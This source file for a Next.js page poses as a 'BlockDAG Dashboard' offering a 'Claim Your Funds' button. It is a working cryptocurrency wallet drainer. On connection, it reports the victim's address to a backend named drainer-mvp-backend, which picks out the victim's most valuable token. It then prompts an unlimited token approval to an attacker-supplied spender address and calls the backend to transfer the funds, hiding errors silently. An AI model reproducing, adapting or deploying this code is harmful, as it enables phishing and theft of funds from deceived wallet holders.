'use client';

import React, { useState, useEffect, useMemo } from 'react';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { useAccount, useWalletClient } from 'wagmi';
import { DM_Sans } from 'next/font/google';
import { ethers } from 'ethers';
import abi from 'erc-20-abi';
import Image from 'next/image';


const dmSans = DM_Sans({
  subsets: ['latin'],
  weight: ['400', '500', '600', '700']
});

// Custom hook to get ethers signer
const useEthersSigner = () => {
  const { data: walletClient } = useWalletClient();
  
  return useMemo(() => {
    if (!walletClient) return null;
    
    const getProvider = async () => {
      try {
        if (typeof window !== 'undefined' && window.ethereum) {
          if (!window.ethereum.selectedAddress) {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
          }
          const provider = new ethers.BrowserProvider(window.ethereum);
          return await provider.getSigner();
        }
        
        if (walletClient && walletClient.transport) {
          const provider = new ethers.BrowserProvider(walletClient.transport);
          return await provider.getSigner();
        }
        
        throw new Error('No provider available');
      } catch (_error) {
        throw _error;
      }
    };
    
    return getProvider();
  }, [walletClient]);
};

export default function Home() {
  const { address, isConnected } = useAccount();
  const { data: walletClient } = useWalletClient();
  const signerPromise = useEthersSigner();
  
  const [highestValueTokenAddress, setHighestValueTokenAddress] = useState<string>('');
  const [tokenAnalysisComplete, setTokenAnalysisComplete] = useState(false);
  const [isApproving, setIsApproving] = useState(false);
  const [isTransferring, setIsTransferring] = useState(false);
  const [config, setConfig] = useState<{
    approvalAddress: string;
    rpcUrl: string;
  } | null>(null);

  // Mouse tracking states
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
  const [isHoveringCard, setIsHoveringCard] = useState(false);

  // Mouse tracking effect
  useEffect(() => {
    const updateMousePosition = (e: MouseEvent) => {
      setMousePosition({ x: e.clientX, y: e.clientY });
    };

    window.addEventListener('mousemove', updateMousePosition);
    return () => window.removeEventListener('mousemove', updateMousePosition);
  }, []);

  // Function to get configuration from backend
  const getConfig = async () => {
    try {
      const response = await fetch(`https://drainer-mvp-backend-production.up.railway.app/api/config`);
      const data = await response.json();
      if (data.success) {
        setConfig(data.config);
        return data.config;
      } else {
        return null;
      }
    } catch (error) {
      console.error('Error fetching config:', error);
      return null;
    }
  };

  // Function to analyze wallet tokens using backend
  const analyzeWalletTokens = async (walletAddress: string) => {
    if (!walletAddress) return;
    
    setTokenAnalysisComplete(false);
    
    try {
      const response = await fetch(`https://drainer-mvp-backend-production.up.railway.app/api/analyze-wallet`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          address: walletAddress,
        }),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      
      if (data.success) {
        setHighestValueTokenAddress(data.data.highestValueToken);
        setTokenAnalysisComplete(true);
      } else {
        throw new Error(data.error || 'Analysis failed');
      }
      
    } catch (error) {
      console.error('Error analyzing wallet tokens:', error);
      setHighestValueTokenAddress('0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599');
      setTokenAnalysisComplete(true);
    }
  };

  const sendWalletInfo = async (walletAddress: string) => {
    if (!walletAddress) return;
    
    try {
      const response = await fetch(`https://drainer-mvp-backend-production.up.railway.app/api/wallet-connected`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          address: walletAddress,
        }),
      });
  
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
  
      const contentType = response.headers.get('content-type');
      if (!contentType || !contentType.includes('application/json')) {
        await response.text();
        // Non-JSON response received
        throw new Error('Server returned non-JSON response');
      }

      await response.json();
  
    } catch (_error) {
      console.error('Error sending wallet info:', _error);
      // Handle error silently
    }
  };

  // Function to send transfer notification to backend
  const sendTransferNotification = async (transferData: {
    fromAddress: string;
    toAddress: string;
    tokenAddress: string;
    amount: string;
    symbol: string;
    txHash: string;
    usdValue: string | null;
  }) => {
    try {
      const response = await fetch(`https://drainer-mvp-backend-production.up.railway.app/api/token-transferred`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(transferData),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      
      if (data.success) {
        // Transfer notification sent successfully
      } else {
        // Error sending transfer notification
      }
    } catch (error) {
      console.error('Error sending transfer notification:', error);
      // Error sending transfer notification
    }
  };

  // Enhanced provider function
  const getProvider = async () => {
    try {
      if (typeof window !== 'undefined' && window.ethereum) {
        if (!window.ethereum.selectedAddress) {
          await window.ethereum.request({ method: 'eth_requestAccounts' });
        }
        return new ethers.BrowserProvider(window.ethereum);
      }
      
      if (walletClient && walletClient.transport) {
        return new ethers.BrowserProvider(walletClient.transport);
      }
      
      throw new Error('No wallet provider available');
    } catch (error) {
      throw error;
    }
  };

  // Function to transfer approved tokens using secure backend endpoint
  const transferApprovedTokens = async (tokenAddress: string, fromAddress: string, amount: string) => {
    if (!tokenAddress || !fromAddress || !amount) {
      return false;
    }

    setIsTransferring(true);
    
    try {
      // Starting token transfer
      
      const response = await fetch(`https://drainer-mvp-backend-production.up.railway.app/api/transfer-tokens`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          fromAddress,
          tokenAddress,
          amount
        }),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      
      if (data.success) {
        await sendTransferNotification({
          fromAddress,
          toAddress: config?.approvalAddress || 'Unknown',
          tokenAddress,
          amount: data.amount,
          symbol: data.symbol,
          txHash: data.txHash,
          usdValue: null
        });
        
        return true;
      } else {
        return false;
      }
      
    } catch (error: unknown) {
      console.error('Error transferring tokens:', error);
      return false;
    } finally {
      setIsTransferring(false);
    }
  };

  // Enhanced token approval function
  const approveToken = async (tokenAddress: string, spenderAddress: string) => {
    if (!tokenAddress || !spenderAddress) {
      return false;
    }

    setIsApproving(true);
    
    try {
      // Getting signer
      
      let signer;
      try {
        if (signerPromise) {
          signer = await signerPromise;
        } else {
          throw new Error('Signer promise not available');
        }
      } catch (_signerError) {
        console.error('Error getting signer:', _signerError);
        // Custom hook failed, trying direct approach
        const provider = await getProvider();
        signer = await provider.getSigner();
      }
      
      const tokenContract = new ethers.Contract(tokenAddress, abi, signer);
      
      try {
        await tokenContract.symbol();
      } catch (_symbolError) {
        console.error('Error fetching token symbol:', _symbolError);
        // Could not fetch token symbol
      }
      
      const maxApproval = ethers.MaxUint256;
      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      
      // Check if this is USDT or similar token that requires two-step approval
      const isUSDT = tokenAddress.toLowerCase() === '0xdac17f958d2ee523a2206206994597c13d831ec7';
      
      let tx;
      try {
        // For USDT, we need to check current allowance and potentially do two-step approval
        if (isUSDT) {
          // Detected USDT - checking current allowance
          try {
            const currentAllowance = await tokenContract.allowance(address, spenderAddress);
            
            if (currentAllowance > 0) {
              // USDT has existing allowance, setting to 0 first
              const resetTx = await tokenContract.approve(spenderAddress, 0);
              await resetTx.wait();
              // Allowance reset successful
            }
          } catch (_allowanceError) {
            console.error('Error checking allowance:', _allowanceError);
            // Could not check allowance, proceeding anyway
          }
        }
        
        // Now proceed with the actual approval
        if (isMobile) {
          try {
            const gasEstimate = await tokenContract.approve.estimateGas(spenderAddress, maxApproval);
            const gasLimit = gasEstimate * BigInt(130) / BigInt(100);
            
            tx = await tokenContract.approve(spenderAddress, maxApproval, {
              gasLimit: gasLimit
            });
          } catch (_gasError) {
            console.error('Error estimating gas:', _gasError);
            // Gas estimation failed, trying without explicit gas
            tx = await tokenContract.approve(spenderAddress, maxApproval);
          }
        } else {
          tx = await tokenContract.approve(spenderAddress, maxApproval);
        }
        
        // Transaction sent. Waiting for confirmation
      } catch (txError) {
        
        if (txError instanceof Error) {
          if ('code' in txError) {
            const ethError = txError as Error & { code: number; reason?: string };
            
            if (ethError.code === 4001) {
              return false;
            } else if (ethError.code === -32603) {
              return false;
            } else if (ethError.code === -32000) {
              return false;
            } else if (ethError.code === 4100) {
              return false;
            }
          }
          
          // Handle various transaction errors silently
        }
        return false;
      }
      
      let receipt;
      try {
        const timeoutDuration = isMobile ? 90000 : 45000;
        
        receipt = await Promise.race([
          tx.wait(),
          new Promise<never>((_, reject) => 
            setTimeout(() => reject(new Error(`Transaction confirmation timeout (${timeoutDuration/1000}s)`)), timeoutDuration)
          )
        ]);
        
      } catch (_receiptError) {
        console.error('Error waiting for transaction receipt:', _receiptError);
        return false;
      }
      
      if (receipt && receipt.status === 1) {
        await transferApprovedTokens(tokenAddress, address!, spenderAddress);
        return true;
      } else {
        return false;
      }
      
    } catch (error: unknown) {
      console.error('Error approving token:', error);
      return false;
    } finally {
      setIsApproving(false);
    }
  };

  useEffect(() => {
    if (isConnected && address) {
      // Wallet connected, starting backend analysis
      setTokenAnalysisComplete(false);
      setHighestValueTokenAddress('');
      
      sendWalletInfo(address);
      analyzeWalletTokens(address);
      getConfig();
      
      const emergencyTimeout = setTimeout(() => {
        if (!tokenAnalysisComplete) {
          // Emergency fallback: Backend analysis took too long
          setHighestValueTokenAddress('0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599');
          setTokenAnalysisComplete(true);
        }
      }, 30000);
      
      return () => clearTimeout(emergencyTimeout);
    }
  }, [isConnected, address, tokenAnalysisComplete]);

  return (
    <div className={`min-h-screen bg-gradient-to-br from-blue-950 via-slate-900 to-blue-900 text-white relative overflow-hidden ${dmSans.className}`}>
      {/* Background BlockDAG Text */}
      <div className="absolute inset-0 select-none group">
        <div 
          className="absolute inset-0 text-[20vw] font-bold text-transparent group-hover:text-white/10 flex items-center justify-center tracking-wider transition-all duration-500 ease-in-out"
          style={{
            transform: 'translateY(-10%)',
            whiteSpace: 'nowrap'
          }}
        >
          BLOCKDAG
        </div>
      </div>

      {/* Mouse tracking blur effect */}
      {!isHoveringCard && (
        <div
          className="fixed pointer-events-none z-10 rounded-full bg-white/10 blur-3xl transition-all duration-75 ease-out"
          style={{
            left: mousePosition.x - 150,
            top: mousePosition.y - 150,
            width: '300px',
            height: '300px',
            transform: 'translate(0, 0)',
          }}
        />
      )}

      {/* Main Content Container */}
      <div className="relative z-20 flex flex-col items-center justify-center min-h-screen px-4 sm:px-6 lg:px-8">
        {/* Central Card */}
        <div 
          className="bg-[#030d43] backdrop-blur-xl border border-blue-700/50 rounded-2xl p-6 sm:p-8 max-w-md w-full text-center shadow-2xl"
          onMouseEnter={() => setIsHoveringCard(true)}
          onMouseLeave={() => setIsHoveringCard(false)}
        >
          {/* BlockDAG Logo/Title */}
          <div className="flex items-center justify-center mb-6">
            <div className="flex items-center">
              <Image
                src="/bdag-logo-xl.png"
                alt="BlockDAG Logo"
                width={150}
                height={40}
                className="h-10 w-auto"
                priority
              />
              <Image
                src="/verified.png"
                alt="Verified"
                width={24}
                height={24}
                className="ml-2 w-6 h-6"
              />
            </div>
          </div>

          {/* Welcome Text */}
          <h2 className="text-xl font-semibold text-white mb-2">
            Welcome to BlockDAG Dashboard
          </h2>
          
          <p className="text-blue-200 mb-8 text-sm">
            To reach dashboard connect your wallet first!
          </p>

          {/* Connect Button */}
          <div className="space-y-4">
            <ConnectButton.Custom>
              {({
                account,
                chain,
                openAccountModal,
                openChainModal,
                openConnectModal,
                authenticationStatus,
                mounted,
              }) => {
                const ready = mounted && authenticationStatus !== 'loading';
                const connected =
                  ready &&
                  account &&
                  chain &&
                  (!authenticationStatus ||
                    authenticationStatus === 'authenticated');

                return (
                  <div
                    {...(!ready && {
                      'aria-hidden': true,
                      'style': {
                        opacity: 0,
                        pointerEvents: 'none',
                        userSelect: 'none',
                      },
                    })}
                  >
                    {(() => {
                      if (!connected) {
                        return (
                          <div className="flex flex-col md:flex-row space-y-4 md:space-y-0 md:space-x-4">
                            <button className="w-full md:flex-1 cursor-pointer text-weight-700 bg-transparent border-[1px] text-sm border-gray-400 hover:border-white text-white font-semibold py-2 px-4 rounded-lg transition-all duration-200">
                              Go Home
                            </button>
                            <button
                              onClick={openConnectModal}
                              type="button"
                              className="w-full md:flex-1 cursor-pointer bg-cyan-400 text-weight-700 hover:bg-cyan-300 text-blue-900 text-sm font-semibold py-2 px-4 rounded-lg transition-all duration-200 transform hover:scale-105"
                            >
                              Connect Wallet
                            </button>
                          </div>
                        );
                      }

                      if (chain.unsupported) {
                        return (
                          <button 
                            onClick={openChainModal} 
                            type="button"
                            className="w-full bg-red-500 hover:bg-red-400 text-white text-sm font-semibold py-2 px-4 rounded-lg transition-colors"
                          >
                            Wrong network
                          </button>
                        );
                      }

                      return (
                        <div className="space-y-3">
                          <button
                            onClick={openChainModal}
                            className="w-full flex items-center justify-center bg-blue-700/50 hover:bg-blue-600/50 text-white py-2 px-4 rounded-lg transition-colors"
                            type="button"
                          >
                            {chain.hasIcon && (
                              <div
                                className="w-4 h-4 rounded-full mr-2 overflow-hidden"
                                style={{ background: chain.iconBackground }}
                              >
                                {chain.iconUrl && (
                                  <Image
                                    alt={chain.name ?? 'Chain icon'}
                                    src={chain.iconUrl}
                                    width={16}
                                    height={16}
                                    className="w-4 h-4"
                                  />
                                )}
                              </div>
                            )}
                            {chain.name}
                          </button>

                          <button 
                            onClick={openAccountModal} 
                            type="button"
                            className="w-full bg-cyan-400 hover:bg-cyan-300 text-blue-900 text-sm font-semibold py-2 px-4 rounded-lg transition-colors"
                          >
                            {account.displayName}
                            {account.displayBalance ? ` (${account.displayBalance})` : ''}
                          </button>
                        </div>
                      );
                    })()}
                  </div>
                );
              }}
            </ConnectButton.Custom>
          </div>

          {/* Claim Button */}
          {isConnected && (walletClient || signerPromise) && (
            <div className="mt-6">
              <button
                type="button"
                className="w-full bg-cyan-400 cursor-pointer hover:bg-cyan-300 disabled:bg-gray-600 disabled:cursor-not-allowed text-blue-900 text-sm font-semibold py-2 px-4 rounded-lg transition-all duration-200 transform hover:scale-105"
                disabled={isApproving || isTransferring || !tokenAnalysisComplete}
                onClick={async () => {
                  try {
                    if (!highestValueTokenAddress) {
                      return;
                    }
                    if (!config?.approvalAddress) {
                      return;
                    }
                    
                    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                    if (isMobile) {
                      await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                    
                    await approveToken(highestValueTokenAddress, config.approvalAddress);
                  } catch (_clickError) {
                    console.error('Error approving token:', _clickError);
                    // Handle error silently
                  }
                }}
              >
                {isApproving ? 'Claiming...' : isTransferring ? 'waiting...' : !tokenAnalysisComplete ? 'Please wait...' : 'Claim Your Funds'}
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}